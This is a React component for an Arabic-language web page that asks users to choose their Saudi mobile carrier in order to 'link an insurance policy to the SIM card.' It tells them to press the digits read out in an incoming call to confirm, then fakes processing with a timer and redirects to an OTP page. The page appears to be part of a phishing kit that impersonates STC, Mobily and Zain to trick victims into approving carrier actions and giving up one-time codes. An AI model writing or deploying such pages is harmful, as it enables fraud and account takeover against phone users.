import { useNavigate } from 'react-router-dom';
import { useState } from 'react';
import { Phone, ArrowLeft, Loader2, Smartphone, AlertCircle, Info } from 'lucide-react';

const carriers = [
  { id: 'stc', name: 'اس تي سي', color: '#9c1710' },
  { id: 'mobily', name: 'موبايلي', color: '#ff7900' },
  { id: 'zain', name: 'زين', color: '#1a1a1a' },
];

export default function STC() {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [selected, setSelected] = useState('');
  const [error, setError] = useState('');

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!selected) {
      setError('برجاء اختيار مشغل شبكة الجوال');
      return;
    }
    setError('');
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      navigate('/stcOtp');
    }, 1500);
  };

  return (
    <div className="flex min-h-screen items-center justify-center bg-gradient-to-br from-primary-50 via-white to-secondary-50 pt-16 md:pt-20 py-12">
      <div className="container-x">
        <div className="mx-auto max-w-md">
          <div className="animate-scale-in rounded-3xl bg-white p-8 shadow-xl ring-1 ring-dark-200/60">
            <div className="mb-6 text-center">
              <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-2xl bg-primary-50">
                <Smartphone className="h-8 w-8 text-primary-600" />
              </div>
              <h1 className="mt-4 text-2xl font-bold text-dark-900">اختر مشغل الشبكة</h1>
              <p className="mt-2 text-sm text-dark-500">
                لاستكمال إجراءات استبدال وربط وثيقة التأمين بشريحة الجوال
              </p>
            </div>

            {error && (
              <div className="mb-4 flex items-center gap-2 rounded-xl bg-error-50 p-3 text-sm text-error-700">
                <AlertCircle className="h-5 w-5 flex-shrink-0" />
                {error}
              </div>
            )}

            <div className="mb-6 flex items-start gap-3 rounded-xl bg-warning-50 p-4">
              <Info className="h-5 w-5 flex-shrink-0 text-warning-600" />
              <p className="text-xs text-dark-600">
                وذلك من خلال اختيار المشغل الظاهر أدناه. ستصلك مكالمة من مزود الخدمة،
                يرجى اتباع الإرشادات الصوتية والضغط على الرقم الذي تسمعه لتأكيد الطلب.
              </p>
            </div>

            <form onSubmit={handleSubmit} className="space-y-3">
              {carriers.map((carrier) => (
                <button
                  key={carrier.id}
                  type="button"
                  onClick={() => {
                    setSelected(carrier.id);
                    setError('');
                  }}
                  className={`flex w-full items-center gap-4 rounded-2xl border-2 p-4 transition-all ${
                    selected === carrier.id
                      ? 'border-primary-500 bg-primary-50'
                      : 'border-dark-200 hover:border-primary-300'
                  }`}
                >
                  <div
                    className="flex h-12 w-12 items-center justify-center rounded-xl text-lg font-bold text-white"
                    style={{ backgroundColor: carrier.color }}
                  >
                    {carrier.name.charAt(0)}
                  </div>
                  <span className="flex-1 text-right font-semibold text-dark-900">{carrier.name}</span>
                  <div
                    className={`h-5 w-5 rounded-full border-2 ${
                      selected === carrier.id
                        ? 'border-primary-600 bg-primary-600'
                        : 'border-dark-300'
                    }`}
                  >
                    {selected === carrier.id && (
                      <div className="h-full w-full rounded-full" style={{ background: 'white', margin: '3px' }} />
                    )}
                  </div>
                </button>
              ))}

              <div className="pt-2">
                <button type="submit" disabled={loading} className="btn-primary w-full disabled:opacity-60">
                  {loading ? (
                    <>
                      <Loader2 className="h-5 w-5 animate-spin" />
                      جاري المعالجة...
                    </>
                  ) : (
                    <>
                      متابعة
                      <ArrowLeft className="h-5 w-5" />
                    </>
                  )}
                </button>
              </div>
            </form>

            <div className="mt-6 flex items-center justify-center gap-2 text-sm text-dark-400">
              <Phone className="h-4 w-4" />
              <span>للمساعدة: </span>
              <a href="tel:920000000" className="font-semibold text-primary-600" dir="ltr">920 000 000</a>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
